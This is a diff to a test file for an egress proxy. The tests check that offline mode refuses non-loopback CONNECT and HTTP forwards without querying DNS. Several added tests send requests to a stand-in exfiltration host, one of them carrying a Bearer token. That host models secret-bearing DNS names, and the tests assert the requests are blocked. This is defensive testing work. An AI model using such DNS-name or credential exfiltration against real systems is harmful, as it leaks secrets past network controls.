@@ -4,9 +4,11 @@
  * Offline mode means nothing leaves the machine. The host proxy dials upstream over raw node:https /
  * node:http sockets, not through `trentFetch`, so a host-side tool whose request reached the loopback
  * listener used to pass `trentFetch`'s loopback rule and then leave the machine through the proxy.
- * The property pinned here: while offline, every CONNECT and every plain-HTTP forward resolves its
- * upstream once under the LOOPBACK policy and is refused (`offline_non_loopback`, 403) unless every
- * address is loopback — whatever the allowlist says — before any upstream request is created.
+ * The property pinned here: while offline, every CONNECT and every plain-HTTP forward is refused
+ * (`offline_non_loopback`, 403) unless its upstream is loopback by definition (an IP literal,
+ * `localhost`, `*.localhost`) — whatever the allowlist says — before any upstream request is created.
+ * No name is ever sent to a resolver offline: the query itself would leave the machine. The injected
+ * resolvers below answer (public or loopback) only to prove they are never asked.
  *
  * Upstream requests are counted with spies on `https.request` / `http.request` whose fakes never open
  * a socket, so a leak would be recorded, not performed. Every resolver is injected; no real DNS.
@@ -27,8 +29,9 @@ import { proxyRequest, startRecordingUpstream, type RecordingUpstream } from "./
 import type { LookupFn } from "../tools/web/url-safety.js";
 
 const PUBLIC_HOST = "api.offline-leak.test"; // allowlisted, resolves to public space
-const LOCAL_HOST = "svc.localhost"; // allowlisted, resolves to loopback
+const LOCAL_HOST = "svc.localhost"; // allowlisted, loopback by definition (RFC 6761)
 const PUBLIC_ADDRESS = "93.184.216.34";
+const EXFIL_HOST = "exfil-198-51-100-7.example.com"; // a secret-bearing name: offline it must never reach a resolver
 
 function answering(addresses: string[]): { lookup: LookupFn; calls: string[] } {
   const calls: string[] = [];
@@ -155,7 +158,7 @@ describe("[O-03] EgressProxy — offline mode refuses any upstream that is not l
     });
     expect(res.connectStatus).toBe(403);
     expect(upstreamRequests).toEqual([]);
-    expect(dns.calls.every((h) => h === PUBLIC_HOST)).toBe(true);
+    expect(dns.calls).toEqual([]); // refused unresolved: the name never reaches a resolver
     expect(decisions.filter((d) => d.rule === "offline_non_loopback")).toEqual([
       { host: PUBLIC_HOST, port: 443, verdict: "refused", rule: "offline_non_loopback" },
       { host: PUBLIC_HOST, port: 443, verdict: "refused", rule: "offline_non_loopback" },
@@ -173,20 +176,15 @@ describe("[O-03] EgressProxy — offline mode refuses any upstream that is not l
     expect(res.status).toBe(403);
     expect(JSON.parse(res.body)).toMatchObject({ error: "egress_refused", reason: "offline_non_loopback" });
     expect(upstreamRequests).toEqual([]);
-    expect(dns.calls).toEqual([PUBLIC_HOST]);
+    expect(dns.calls).toEqual([]); // refused unresolved: the name never reaches a resolver
     expect(decisions).toEqual([{ host: PUBLIC_HOST, port: 80, verdict: "refused", rule: "offline_non_loopback" }]);
   });
 
-  it("offline: refuses when ANY address in the one answer is off the machine", async () => {
-    const dns = answering(["127.0.0.1", PUBLIC_ADDRESS]);
-    const proxy = await startProxy({ offline: true, lookup: dns.lookup });
-    spyUpstream(() => proxy.getPort());
-    expect(await rawConnect(proxy.getPort(), `${LOCAL_HOST}:443`)).toEqual({ status: 403, reason: "offline_non_loopback" });
-    expect(upstreamRequests).toEqual([]);
-  });
-
-  it("offline: an allowlisted upstream that resolves to loopback is still reached, resolved once", async () => {
-    const dns = answering(["127.0.0.1"]);
+  // [DNS-name leak] This used to resolve svc.localhost through the injected lookup (and a sibling test
+  // refused a mixed loopback+public answer). Offline no name is resolved any more: `*.localhost` is
+  // 127.0.0.1 by definition, so the resolver here answers off the machine and must never be asked.
+  it("offline: an allowlisted *.localhost upstream is reached at 127.0.0.1 with zero resolver queries", async () => {
+    const dns = answering([PUBLIC_ADDRESS]);
     const decisions: EgressDecision[] = [];
     const proxy = await startProxy({ offline: true, lookup: dns.lookup }, decisions);
     const before = upstream.requests.length;
@@ -198,7 +196,7 @@ describe("[O-03] EgressProxy — offline mode refuses any upstream that is not l
     expect(res.status).toBe(200);
     expect(upstream.requests.length).toBe(before + 1);
     expect(upstream.requests.at(-1)?.headers.host).toBe(LOCAL_HOST);
-    expect(dns.calls).toEqual([LOCAL_HOST]); // the CONNECT's resolution is the one the dial uses
+    expect(dns.calls).toEqual([]); // pinned by definition, never resolved
     expect(decisions.at(-1)).toMatchObject({ host: LOCAL_HOST, verdict: "allowed" });
   });
 
@@ -217,6 +215,28 @@ describe("[O-03] EgressProxy — offline mode refuses any upstream that is not l
     });
     expect(res.connectStatus).toBe(200);
     expect(upstream.requests.at(-1)?.url).toBe("/v1/override");
+  });
+
+  // [O-03 DNS-name leak] The resolver below answers loopback, so the old resolve-then-decide rule would
+  // have let the name through. The point is that the name is never asked about at all: the query is the leak.
+  it("offline: a CONNECT to a non-local name is refused offline_non_loopback with zero resolver queries and no upstream socket", async () => {
+    const dns = answering(["127.0.0.1"]);
+    const proxy = await startProxy({ offline: true, lookup: dns.lookup, interceptDomains: [EXFIL_HOST] });
+    spyUpstream(() => proxy.getPort());
+    expect(await rawConnect(proxy.getPort(), `${EXFIL_HOST}:443`)).toEqual({ status: 403, reason: "offline_non_loopback" });
+    expect(dns.calls).toEqual([]);
+    expect(upstreamRequests).toEqual([]);
+  });
+
+  it("offline: a plain-HTTP forward to a non-local name is refused offline_non_loopback with zero resolver queries and no upstream request", async () => {
+    const dns = answering(["127.0.0.1"]);
+    const proxy = await startProxy({ offline: true, lookup: dns.lookup, interceptDomains: [EXFIL_HOST] });
+    spyUpstream(() => proxy.getPort());
+    const res = await plainProxyRequest(proxy.getPort(), `http://${EXFIL_HOST}/x`, { authorization: `Bearer ${token}` });
+    expect(res.status).toBe(403);
+    expect(JSON.parse(res.body)).toMatchObject({ error: "egress_refused", reason: "offline_non_loopback" });
+    expect(dns.calls).toEqual([]);
+    expect(upstreamRequests).toEqual([]);
   });
 
   it("offline is read from TRENT_OFFLINE when the option is not given", async () => {
